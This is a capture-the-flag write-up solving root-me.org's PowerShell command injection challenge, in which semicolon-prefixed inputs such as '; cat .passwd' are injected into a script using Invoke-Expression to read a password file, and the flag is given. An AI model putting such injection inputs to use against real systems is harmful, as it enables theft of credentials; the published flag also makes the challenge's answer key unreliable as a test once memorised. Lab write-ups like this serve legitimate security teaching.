---
title: Powershell - Command Injection - root-me.org
published: true
---

# [](#intro)Introduction

In this write-up, we're taking a different route by tackling a Windows machine CTF. This CTF is hosted at [Root-me](https://www.root-me.org) in the App Script tab. It is also ranked as easy! Let's see what we have.

# [](#level-description)Challenge description

The 'Statement' says:

> Statement

> Recover the database’s password.

A cryptic task, indeed! It seems we need to ssh into the machine to take a look and understand what this CTF is about. However, before doing so, let's brush up on Powershell and command injection to sharpen our strategic approach mindset.

To ssh into the machine, we run the command:

`ssh -p 2225 app-script-ch18@challenge05.root-me.org`

with the password `app-script-ch18`.

## [](#mindset-step1)Step 1 - Understanding basic concepts

### Powershell 101

Firstly, let's discuss Powershell. Powershell serves as a Windows shell, akin to how Bash functions in Linux (or MacOS). Succeeding the older 'CMD' shell, Powershell can be seen as an enhanced version of CMD, offering a more robust feature set.

In Powershell, numerous commands are similar to those in CMD, but it also introduces a plethora of new ones exclusive to it. For example, commands like `ls`, `cat`, `mkdir` and `pwd` are integrated from the Bash into Powershell. 

For a simplistic introduction, this should suffice. However, if you are interested in how to level you Powershell game up, check it out [this](https://github.com/lllife-uncat/powershell-101/blob/master/PG_PowerShell_XWIPSCRE01_0.pdf) github repository. It contains a PDF full of insights on how to succeed using this shell!

### Command injection

Command injection is a cyber attack that involves executing arbitrary commands on a host operating system (OS). Put in simple terms, a command injection vulnerability is one that the attacker disrupts the normal flow of a script, injecting arbitrary - usually not intended by the developer - code. This form of attack is distinct from other types of code injection, as it specifically targets command execution within an operating system's environment. 

For a good reference, check it out the OWASP command injection [page](https://owasp.org/www-community/attacks/Command_Injection). It demonstrates how this usually happens within a Unix environment.

## [](#mindset-step2)Step 2 - Understanding the problem

Now that we've grasped the basic concepts that this challenge is involved with, let's ssh into the machine and take a look around. Remember, this is a Powershell machine, so be comfortable working with Windows shell commands. 

Here's the greeting we receive upon sshing:

```bash
ssh -p 2225 app-script-ch18@challenge05.root-me.org
      _           _ _                        ___  ____  
  ___| |__   __ _| | | ___ _ __   __ _  ___ / _ \| ___| 
 / __| '_ \ / _` | | |/ _ \ '_ \ / _` |/ _ \ | | |___ \ 
| (__| | | | (_| | | |  __/ | | | (_| |  __/ |_| |___) |
 \___|_| |_|\__,_|_|_|\___|_| |_|\__, |\___|\___/|____/ 
                                 |___/ root-me.org      

app-script-ch18@challenge05.root-me.org's password: 
Table to dump:
```

This interface suggests that we are interacting with a command line program or script, rather than being directly in the shell environment. Let's type any command to see what happens:

```bash
Table to dump:
> ls
Connect to the database With the secure Password: 76492d1116743f0423413b16050a5345MgB8AGQ
ALwBSAFAAagBxADkAYwBOAHgAegAyAEQAcgB2AGEAbgAvAFUAbgBYAHcAPQA9AHwAYwA5ADIANQAxAGQAYwA0AGYA
NgAzAGYAZQA4AGIAOQA4ADYAZQA1AGUAOAA0ADIAMwA2ADAANQAwAGMAOQAzADcAMgAzADYAMAAzADgAMQAyADkAZ
QA4AGMAMQBiADAAYQA4ADAAMAAxAGMAMQA1AGYAMABjADcAOABhADAAZgBlADkAYgAwADgAYQAwAGMAOQBiAGMAZg
A1ADkANgAyADcANQBmAGEAOAAzAGIAMwA1ADcAZQAzADYAOQBjAGYA. Backup the table ls
Table to dump:
>
```

Alright, we are indeed inside a command line interface. We are not able to run Powershell commands, but since the problem says we have command injection, we might need to break this interface and access the shell. This is our goal!

### Context

This command line interface might be something like this, in powershell:

```powershell
Function Simulate-Interaction {
        while ($true) {
                Write-Host "Table to dump:"
                $input = Read-Host "> "

                Write-Host "Connect to the database With the secure Password: 76492d1116743f0423413b16050a5345MgB8AGQ
ALwBSAFAAagBxADkAYwBOAHgAegAyAEQAcgB2AGEAbgAvAFUAbgBYAHcAPQA9AHwAYwA5ADIANQAxAGQAYwA0AGYA
NgAzAGYAZQA4AGIAOQA4ADYAZQA1AGUAOAA0ADIAMwA2ADAANQAwAGMAOQAzADcAMgAzADYAMAAzADgAMQAyADkAZ
QA4AGMAMQBiADAAYQA4ADAAMAAxAGMAMQA1AGYAMABjADcAOABhADAAZgBlADkAYgAwADgAYQAwAGMAOQBiAGMAZg
A1ADkANgAyADcANQBmAGEAOAAzAGIAMwA1ADcAZQAzADYAOQBjAGYA. Backup the table $input"
        }
}

Simulate-Interaction
```

To simulate it, let's run a built-in PS shell inside our Linux environment:

```bash
PS /tmp/root-me> ./ps-ci.ps1
Table to dump:
> : test
Connect to the database With the secure Password: 76492d1116743f0423413b16050a5345MgB8AGQ
ALwBSAFAAagBxADkAYwBOAHgAegAyAEQAcgB2AGEAbgAvAFUAbgBYAHcAPQA9AHwAYwA5ADIANQAxAGQAYwA0AGYA
NgAzAGYAZQA4AGIAOQA4ADYAZQA1AGUAOAA0ADIAMwA2ADAANQAwAGMAOQAzADcAMgAzADYAMAAzADgAMQAyADkAZ
QA4AGMAMQBiADAAYQA4ADAAMAAxAGMAMQA1AGYAMABjADcAOABhADAAZgBlADkAYgAwADgAYQAwAGMAOQBiAGMAZg
A1ADkANgAyADcANQBmAGEAOAAzAGIAMwA1ADcAZQAzADYAOQBjAGYA. Backup the table test
```

Yep. That looks almost the same as the CTF. See, a command injection vulnerability happens when our `$input` variable breaks the `Write-Host` command and runs another on instead. In our code, however, that is not possible, as `Write-Host` is not prone to command injection. However, we can think that the script flow is similar to this one. To break out the string, we would use the `;` pipe in Powershell, which is the same as saying: hey PS, besides what you need to run, do also run the following command as well. Here's an example:

```bash
PS /tmp/root-me> whoami; ls
kaizen
cinjection  cinjection.c  ps  ps-ci.ps1
```


## [](#mindset-step3)Step 3 - Crafting the attack

We have basically crafted our attack in the last step. The idea here is to break the `$input` that the CTF Powershell script takes with a semi-colon `;` and pass a PS command afterwards. So, the initial attack would be: `; ls` for example.

## [](#mindset-step4)Step 4 - Solving!

Let's try it out:

```bash
Table to dump:
> ; ls
Connect to the database With the secure Password: 76492d1116743f0423413b16050a5345MgB8ADY
AbgBzADgAUQA4AG4AdwB3AGIAbgBNAFcAcgBYAE8AMgBWADkAQgB5AEEAPQA9AHwAYQA5ADcAZgAyAGIAOQA5ADIA
YQBkADIAYwA0ADQAYQA3AGYAMAAxADgAZgA2AGUAMgAzAGYAOQA0AGYAZQBmADkAOQBiADUAZQBkADAAZQAwAGUAO
AA3ADMAMAA1ADkAZQA0ADkAMAA0ADgANQA5ADIAZAA4ADQANgA2ADYAOQA0ADMAMQBlADMANQBjADEANAA0AGQAOQ
AyAGMAYgAyADQANAA2AGUAZAA2ADYANgA1ADYAMABhADYAYgAwADcA. Backup the table


    Directory: C:\cygwin64\challenge\app-script\ch18


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       12/12/2021   9:25 AM             43 .git
-a----       11/21/2021  11:34 AM            150 .key
-a----        4/20/2020  10:50 AM             18 .passwd
------       12/12/2021   9:50 AM            574 ._perms
------       11/21/2021  11:35 AM            348 ch18.ps1
```

Aha! As expected, we could break the input by passing the `;` pipe with another command. Out of curiosity, let's take a look at the `ch18.ps1` script by injecting `; cat ch18.ps1`:

```powershell
$key = Get-Content .key
$SecurePassword = Get-Content .passwd | ConvertTo-SecureString -AsPlainText -Force | Conv
ertFrom-SecureString -key $key

while($true) {
        Write-Host "Table to dump: "
        Write-Host -NoNewLine "> "
        $table=Read-Host

        iex "Write-Host Connect to the database With the secure Password: $SecurePassword
. Backup the table $table"
}
```

Amazing. It is using `iex` CMDlet, which is the short for the `Invoke-Expression` method used for executing code. That is why the subtitle of this CTF is "There’s UI, UX and IEX" xD

To solve this problem, we simply pass the command `; cat .passwd`:

```bash
Table to dump:
> ; cat .passwd
Connect to the database With the secure Password: 76492d1116743f0423413b16050a5345MgB8ADY
AbgBzADgAUQA4AG4AdwB3AGIAbgBNAFcAcgBYAE8AMgBWADkAQgB5AEEAPQA9AHwAYQA5ADcAZgAyAGIAOQA5ADIA
YQBkADIAYwA0ADQAYQA3AGYAMAAxADgAZgA2AGUAMgAzAGYAOQA0AGYAZQBmADkAOQBiADUAZQBkADAAZQAwAGUAO
AA3ADMAMAA1ADkAZQA0ADkAMAA0ADgANQA5ADIAZAA4ADQANgA2ADYAOQA0ADMAMQBlADMANQBjADEANAA0AGQAOQ
AyAGMAYgAyADQANAA2AGUAZAA2ADYANgA1ADYAMABhADYAYgAwADcA. Backup the table
SecureIEXpassword
```

And there we have it! The flag for this CTF is `SecureIEXpassword`.

# [](#conclusions)Conclusion

In this CTF, we learned a bit more about Powershell and command injection. The task was straightforward – to recover a database password within a Windows environment.

We first revised some Powershell concepts, as well as the definition of command injection attacks. The CTF setup led us to leverage the semicolon `;` in Powershell to append and execute additional commands. By applying this technique, we successfully injected command within the environment.

As we can see, this is a simple Powershell CTF. By keeping our approach mindset, it was not difficult to find a way out to catch this flag! 

Thanks for sticking 'til the end. I hope you learned something new today! And remember, always do your **research!**

<a href="/">Go back</a>






